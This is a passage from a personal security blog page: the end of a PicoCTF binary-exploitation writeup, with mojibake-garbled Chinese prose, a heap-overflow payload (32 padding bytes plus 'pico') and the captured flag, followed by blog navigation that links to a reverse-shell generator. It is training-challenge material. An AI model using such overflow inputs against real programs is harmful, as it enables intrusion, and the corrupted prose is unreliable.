<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦è´çš„æ¢ä»¶æ˜¯è®“<code>safe_var</code>ç­‰æ–¼&quot;pico&quot;ï¼ˆå› ç‚º<code>strcmp</code>ç›¸ç­‰çš„è©±å›å‚³ 0ï¼‰ï¼Œæ‰€ä»¥å’Œä¸Šä¸€é¡ŒåŸºæœ¬ä¸Šä¸€æ¨£ï¼Œåªè¦æŠŠè¼¸å…¥ 32 å€‹ bytes å¾Œçš„æ±è¥¿æ›æˆ pico å°±å¯ä»¥äº†ã€‚Payload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€™æ¨£å°±å¾—åˆ° Flag å•¦ã€‚</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;starting_to_get_the_hang_21306688&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/web/" title="avatar"><img class="post-copyright__author_img_back" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/me.png" title="avatar" alt="avatar"><img class="post-copyright__author_img_front" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/me.png" title="avatar" alt="avatar"></a><div class="post-copyright__author_name">S1l3ntC0nquer</div><div class="post-copyright__author_desc">Hack the planet!</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="This article is original. Please be mindful of the copyright agreement." href="https://s1l3ntc0nquer.github.io/web/posts/6526bdbd/">Original</a><a class="post-copyright-title"><span onclick='rm.copyPageUrl("https://s1l3ntc0nquer.github.io/web/posts/6526bdbd/")'>All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="Support the author"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>Support</div><div class="reward-main"><div class="reward-all"><span class="reward-title">Thank's for supporting me!</span><ul class="reward-group"><li class="reward-item"><a href="https://buymeacoffee.com/S1l3ntC0nquer" target="_blank"><img class="post-qr-code-img" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/buymeacoffee.png" alt="Buy Me a Coffee"></a><div class="post-qr-code-desc">Buy Me a Coffee</div></li><li class="reward-item"><a href="https://s1l3ntc0nquer.github.io/web" target="_blank"><img class="post-qr-code-img" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/me.jpg" alt="S1l3ntC0nquer"></a><div class="post-qr-code-desc">S1l3ntC0nquer</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">Sponsor List</div><div class="reward-dec">Really thanks for your coffeeğŸ™</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display:none"></div></div><div class="shareRight"><script>function copyCurrentPageUrl(){var e=window.location.href,t=document.createElement("input");t.setAttribute("value",e),document.body.appendChild(t),t.select(),t.setSelectionRange(0,99999),document.execCommand("copy"),document.body.removeChild(t)}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="Copy link" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stated additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/web/tags/PicoCTF/"><span class="tags-punctuation"><i class="anzhiyufont anzhiyu-icon-tag"></i></span>PicoCTF<span class="tagsPageCount">12</span></a><a class="post-meta__box__tags" href="/web/tags/Cybersecurity/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Cybersecurity<span class="tagsPageCount">10</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/web/posts/4376026b/"><img class="prev-cover" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" onerror='onerror=null,src="/web/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">All-in-One PicoCTF Writeups: Misc (General Skills)</div></div></a></div><div class="next-post pull-right"><a href="/web/posts/4f98706e/"><img class="next-cover" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" onerror='onerror=null,src="/web/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">All-in-One PicoCTF Writeups: Web</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size:1.5rem;margin-right:4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/web/posts/4f98706e/" title="All-in-One PicoCTF Writeups: Web"><img class="cover" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Web</div></div></a></div><div><a href="/web/posts/4376026b/" title="All-in-One PicoCTF Writeups: Misc (General Skills)"><img class="cover" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Misc (General Skills)</div></div></a></div><div><a href="/web/posts/461e0005/" title="All-in-One PicoCTF Writeups: Reverse"><img class="cover" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Reverse</div></div></a></div><div><a href="/web/posts/83db1007/" title="All-in-One PicoCTF Writeups: Forensics"><img class="cover" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Forensics</div></div></a></div><div><a href="/web/posts/624b1c44/" title="All-in-One PicoCTF Writeups: Crypto"><img class="cover" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-01</div><div class="title">All-in-One PicoCTF Writeups: Crypto</div></div></a></div><div><a href="/web/posts/4c6f99b3/" title="[Day 04] Grinding PicoCTF 2"><img class="cover" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/hackerTraining.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-29</div><div class="title">[Day 04] Grinding PicoCTF 2</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> Comment</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)" style="display:none">Comment Silently</a><a href="/web/privacy" style="margin-left:4px">Privacy policy</a></div><div class="comment-tips" id="comment-tips"><span>âœ… No need to delete blank lines, comment directly for the best display</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div><script>document.addEventListener("DOMContentLoaded",(function(){document.documentElement.lang="en"})),document.addEventListener("pjax:complete",(function(){document.documentElement.lang="en"}))</script></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/me.png" onerror='this.onerror=null,this.src="/web/img/friend_404.gif"' alt="avatar"><div class="author-status"><img class="g-status" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/vampire.png" alt="status"></div></div><div class="author-info__description">This is S1l3ntC0nquer's blog. I share something about hacking, CTF, developing, and other interesting stuff. GLHF!</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/web/"><h1 class="author-info__name">S1l3ntC0nquer</h1><div class="author-info__desc">Hack the planet!</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/S1l3ntC0nquer" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://www.linkedin.com/in/kalpesh11111/" target="_blank" title="LinkedIn"><i class="fa-brands fa-linkedin-in faa-tada"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fontawesome fa-solid fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">0xDEADBEEF</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-Target"><span class="toc-number">2.</span> <span class="toc-text">Local Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VNE"><span class="toc-number">3.</span> <span class="toc-text">VNE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-0"><span class="toc-number">4.</span> <span class="toc-text">buffer overflow 0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-1"><span class="toc-number">5.</span> <span class="toc-text">buffer overflow 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-2"><span class="toc-number">6.</span> <span class="toc-text">buffer overflow 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#two-sum"><span class="toc-number">7.</span> <span class="toc-text">two-sum</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#format-string-0"><span class="toc-number">8.</span> <span class="toc-text">format string 0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#format-string-1"><span class="toc-number">9.</span> <span class="toc-text">format string 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#heap-0"><span class="toc-number">10.</span> <span class="toc-text">heap 0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#heap-1"><span class="toc-number">11.</span> <span class="toc-text">heap 1</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/web/posts/f9317c8b/" title="[HTB] Locked Away Writeup ğŸ”’"><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png" onerror='this.onerror=null,this.src="/web/img/404.jpg"' alt="[HTB] Locked Away Writeup ğŸ”’"></a><div class="content"><a class="title" href="/web/posts/f9317c8b/" title="[HTB] Locked Away Writeup ğŸ”’">[HTB] Locked Away Writeup ğŸ”’</a><time datetime="2024-10-11T06:30:53.000Z" title="Created 2024-10-11 12:00:53">2024-10-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web/posts/e5109b78/" title="Intro to Fermat's Little Theorem"><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/fermatlittle.jpg" onerror='this.onerror=null,this.src="/web/img/404.jpg"' alt="Intro to Fermat's Little Theorem"></a><div class="content"><a class="title" href="/web/posts/e5109b78/" title="Intro to Fermat's Little Theorem">Intro to Fermat's Little Theorem</a><time datetime="2024-10-08T13:02:24.000Z" title="Created 2024-10-08 18:32:24">2024-10-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web/posts/bd7b2870/" title="[HTB] CubeMadness1 Writeup"><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png" onerror='this.onerror=null,this.src="/web/img/404.jpg"' alt="[HTB] CubeMadness1 Writeup"></a><div class="content"><a class="title" href="/web/posts/bd7b2870/" title="[HTB] CubeMadness1 Writeup">[HTB] CubeMadness1 Writeup</a><time datetime="2024-10-07T05:20:06.000Z" title="Created 2024-10-07 10:50:06">2024-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web/posts/517a12d7/" title="Intro to Extended Euclidean Algorithm"><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/9/euclidean_9fab94cfbbb8a5c35339bd17b312eeb9.jpg" onerror='this.onerror=null,this.src="/web/img/404.jpg"' alt="Intro to Extended Euclidean Algorithm"></a><div class="content"><a class="title" href="/web/posts/517a12d7/" title="Intro to Extended Euclidean Algorithm">Intro to Extended Euclidean Algorithm</a><time datetime="2024-09-30T08:42:22.924Z" title="Created 2024-09-30 14:12:22">2024-09-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web/posts/ad637ee9/" title="About the glory of the Hostel life and the fragments of my seven years in JNV"><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/MD_Debate.jpg" onerror='this.onerror=null,this.src="/web/img/404.jpg"' alt="About the glory of the Hostel life and the fragments of my seven years in JNV"></a><div class="content"><a class="title" href="/web/posts/ad637ee9/" title="About the glory of the Hostel life and the fragments of my seven years in JNV">About the glory of the Hostel life and the fragments of my seven years in JNV</a><time datetime="2024-09-23T18:15:29.000Z" title="Created 2024-09-23 23:45:29">2024-09-23</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/S1l3ntC0nquer" title="GitHub"><i class="fa-brands fa-github"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://www.instagram.com/xploitoverload?igsh=cnZ2M2hwamNtcjF1" title="Instagram"><i class="fa-brands fa-instagram"></i></a><img class="footer_mini_logo" title="Back to top" alt="Back to top" onclick="anzhiyu.scrollToDest(0,500)" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/me.jpg" size="50px"><a class="deal_link" target="_blank" rel="noopener" href="https://www.linkedin.com/in/kalpesh11111/" title="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a><a class="deal_link" href="mailto:skalpesh942@gmail.com" title="Email"><i class="fa-solid fa-envelope"></i></a></div><div id="anzhiyu-footer"><div class="footer-group"><div class="footer-title">Articles</div><div class="footer-links"><a class="footer-item" title="Archives" href="/web/archives/">Archives</a><a class="footer-item" title="Categories" href="/web/categories/">Categories</a><a class="footer-item" title="Tags" href="/web/tags/">Tags</a></div></div><div class="footer-group"><div class="footer-title">Social center</div><div class="footer-links"><a class="footer-item" title="Sites" href="/web/link/">Sites</a><a class="footer-item" title="Message board" href="/web/comments/">Message board</a></div></div><div class="footer-group"><div class="footer-title">My</div><div class="footer-links"><a class="footer-item" title="Talks" href="/web/essay/">Talks</a><a class="footer-item" title="Books" href="/web/notyet/">Books</a><a class="footer-item" title="Photos" href="/web/album/">Photos</a></div></div><div class="footer-group"><div class="footer-title">About</div><div class="footer-links"><a class="footer-item" title="Whoami" href="/web/about/">Whoami</a><a class="footer-item" title="Subscribe" href="/web/subscribe/">Subscribe</a><a class="footer-item" title="Portfolio" href="https://s1l3ntc0nquer.github.io/web/">Portfolio</a><a class="footer-item" title="Support me" target="_blank" rel="noopener" href="https://buymeacoffee.com/S1l3ntC0nquer">Support me</a></div></div><div class="footer-group"><div class="footer-title-group"><div class="footer-title">Link exchange</div><a class="random-friends-btn" id="footer-random-friends-btn" href="javascript:addFriendLinksInFooter();" title="Shuffle Links"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i></a></div><div class="footer-links" id="friend-links-in-footer"></div></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2024 By <a class="footer-bar-link" href="/web/" title="S1l3ntC0nquer" target="_blank">S1l3ntC0nquer</a></div></div><div id="footer-type-tips"></div><div class="js-pjax"><script>function subtitleType(){window.typed=new Typed("#footer-type-tips",{strings:["Yes, I am a criminal. My crime is that of curiosity","Join the dark side","Build the universe with me","Hack the planet!","Why? Because I can.","Why? Because it's there.","Happy hacking","Life is bright &#44; Everything is lovely &#44; Life is worth living &#44; The future is promising."],startDelay:300,typeSpeed:200,loop:!0,backSpeed:50})}"function"==typeof Typed?subtitleType():getScript("https://cdn.jsdelivr.net/npm/typed.js@2.1.0/dist/typed.umd.min.js").then(subtitleType)</script></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="Theme">Theme</a><a class="footer-bar-link cc" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.en" title="Copyright"><i class="anzhiyufont anzhiyu-icon-copyright-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-by-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nc-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nd-line"></i></a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/web/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/web/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">37</div></a><a href="/web/categories/" title="category"><div class="headline">Categories</div><div class="length-num">11</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">Contact</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://github.com/S1l3ntC0nquer" title="Github"><img class="back-menu-item-icon" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/github.png" alt="Github"><span class="back-menu-item-text">Github</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.instagram.com/xploitoverload?igsh=cnZ2M2hwamNtcjF1" title="Instagram"><img class="back-menu-item-icon" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/ig.png" alt="Instagram"><span class="back-menu-item-text">Instagram</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.linkedin.com/in/kalpesh11111/" title="LinkedIn"><img class="back-menu-item-icon" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/linkedin.png" alt="LinkedIn"><span class="back-menu-item-text">LinkedIn</span></a><a class="back-menu-item" href="https://s1l3ntc0nquer.github.io/web/assets/Resume.pdf" title="Resume"><img class="back-menu-item-icon" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/me.jpg" alt="Resume"><span class="back-menu-item-text">Resume</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">Others</div><div class="back-menu-list"><a class="back-menu-item" href="https://s1l3ntc0nquer.github.io/web" title="Portfolio"><img class="back-menu-item-icon" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/me.jpg" alt="Portfolio"><span class="back-menu-item-text">Portfolio</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="http://sparkymodz.whf.bz" title="Admin"><img class="back-menu-item-icon" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/hacker.png" alt="Admin"><span class="back-menu-item-text">Admin</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">Useful Tools</div><div class="back-menu-list"><a class="back-menu-item" href="https://s1l3ntc0nquer.github.io/Revershell-Generator" title="RevShells"><img class="back-menu-item-icon" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/hacker.png" alt="RevShells"><span class="back-menu-item-text">RevShells</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://ohmycv.app" title="OhMyCV"><img class="back-menu-item-icon" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/hacker.png" alt="OhMyCV"><span class="back-menu-item-text">OhMyCV</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://gtfobins.github.io/" title="GTFOBins"><img class="back-menu-item-icon" src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/web/assets/hacker.png" alt="GTFOBins"><span class="back-menu-item-text">GTFOBins</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Articles</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/web/archives/"><i class="fa-solid fa-file-zipper faa-tada"></i><span> Archives</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/categories/"><i class="fa-solid fa-icons faa-tada"></i><span> Categories</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/tags/"><i class="fa-solid fa-hashtag faa-tada"></i><span> Tags</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="fa-solid fa-dice faa-tada"></i><span> Random</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>My</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/web/assets/Resume.pdf"><i class="fa-solid fa-file faa-tada"></i><span> Resume</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/music/"><i class="fa-solid fa-music faa-tada"></i><span> Music bar</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/essay/"><i class="fa-solid fa-lightbulb faa-tada"></i><span> Life snippets</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/collect/"><i class="fa-solid fa-medal faa-tada"></i><span> Collections</span></a></li><li><a class="site-page child faa-parent animated-hover" target="_blank" rel="noopener" href="https://S1l3ntC0nquer.notion.site/Bullet-Journal-c79ab73909d94fa387d4b58e85d90494"><i class="fa-solid fa-clipboard-list faa-tada"></i><span> Notes</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>About</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/web/about/"><i class="fa-solid fa-id-badge faa-tada"></i><span> Whoami</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/subscribe/"><i class="fa-solid fa-bell faa-tada"></i><span> Subscribe</span></a></li><li><a class="site-page child faa-parent animated-hover" href="https://s1l3ntc0nquer.github.io/web/"><i class="fa-solid fa-user faa-tada"></i><span> Portfolio</span></a></li></ul></div></div><span class="sidebar-menu-item-title">Tags</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/web/tags/CTF-Crypto-Cryptography-CyberSec-TechStreak30/" style="font-size:.88rem">-CTF - Crypto -Cryptography - CyberSec - TechStreak30<sup>1</sup></a><a href="/web/tags/CTF-PicoCTF-CyberSec-TechStreak30/" style="font-size:.88rem">-CTF - PicoCTF - CyberSec - TechStreak30<sup>1</sup></a><a href="/web/tags/CTF-Security/" style="font-size:.88rem">-CTF -Security<sup>1</sup></a><a href="/web/tags/AI/" style="font-size:.88rem">AI<sup>1</sup></a><a href="/web/tags/AIS3/" style="font-size:.88rem">AIS3<sup>1</sup></a><a href="/web/tags/Assembly-Code/" style="font-size:.88rem">Assembly Code<sup>1</sup></a><a href="/web/tags/Blog/" style="font-size:.88rem">Blog<sup>1</sup></a><a href="/web/tags/Byte-Code/" style="font-size:.88rem">Byte Code<sup>1</sup></a><a href="/web/tags/CCEP/" style="font-size:.88rem">CCEP<sup>1</sup></a><a href="/web/tags/CRT/" style="font-size:.88rem">CRT<sup>1</sup></a><a href="/web/tags/CTF/" style="font-size:.88rem">CTF<sup>28</sup></a><a href="/web/tags/Crypto/" style="font-size:.88rem">Crypto<sup>5</sup></a><a href="/web/tags/Cryptography/" style="font-size:.88rem">Cryptography<sup>1</sup></a><a href="/web/tags/CyberSec/" style="font-size:.88rem">CyberSec<sup>27</sup></a><a href="/web/tags/Cybersecurity/" style="font-size:.88rem">Cybersecurity<sup>10</sup></a><a href="/web/tags/GDSC/" style="font-size:.88rem">GDSC<sup>1</sup></a><a href="/web/tags/GTU/" style="font-size:.88rem">GTU<sup>1</sup></a><a href="/web/tags/GamePwn/" style="font-size:.88rem">GamePwn<sup>1</sup></a><a href="/web/tags/HITCON/" style="font-size:.88rem">HITCON<sup>1</sup></a><a href="/web/tags/HTB/" style="font-size:.88rem">HTB<sup>14</sup></a><a href="/web/tags/HackTheBox/" style="font-size:.88rem">HackTheBox<sup>10</sup></a><a href="/web/tags/Hacker/" style="font-size:.88rem">Hacker<sup>2</sup></a><a href="/web/tags/Hacking/" style="font-size:.88rem">Hacking<sup>1</sup></a><a href="/web/tags/HacktTheBox/" style="font-size:.88rem">HacktTheBox<sup>1</sup></a><a href="/web/tags/Hardware/" style="font-size:.88rem">Hardware<sup>2</sup></a><a href="/web/tags/Machine-Code/" style="font-size:.88rem">Machine Code<sup>1</sup></a><a href="/web/tags/Math/" style="font-size:.88rem">Math<sup>2</sup></a><a href="/web/tags/Misc/" style="font-size:.88rem">Misc<sup>1</sup></a><a href="/web/tags/PicoCTF/" style="font-size:.88rem">PicoCTF<sup>12</sup></a><a href="/web/tags/Pwn/" style="font-size:.88rem">Pwn<sup>15</sup></a><a href="/web/tags/Registers/" style="font-size:.88rem">Registers<sup>1</sup></a><a href="/web/tags/Reverse/" 